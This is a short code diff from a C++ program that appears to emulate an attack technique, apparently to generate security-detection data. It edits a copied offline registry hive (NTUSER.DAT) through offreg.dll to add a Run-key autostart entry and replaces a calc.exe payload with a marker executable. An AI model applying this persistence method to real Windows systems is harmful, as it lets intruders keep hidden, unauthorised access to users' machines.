@@ -14,8 +14,8 @@ int main()
 {
     // Define the path where you copied the logged-out user's hive file
     std::wstring targetHivePath = L"C:\\Users\\Public\\NTUSER.DAT";
-    std::wstring runKeyName = L"Dataset_A06_1b_CPP";
-    std::wstring payloadCommand = L"C:\\Windows\\System32\\calc.exe";
+    std::wstring runKeyName = L"Dataset_A06_1b_OfflineHiveSaveRestore_Persistence";
+    std::wstring payloadCommand = L"C:\\Users\\Public\\A06_1b_persistence_marker.exe";
     std::wstring runKeySubPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
 
     std::wcout << L"[*] Loading offreg.dll to perform offline hive manipulation...\n";
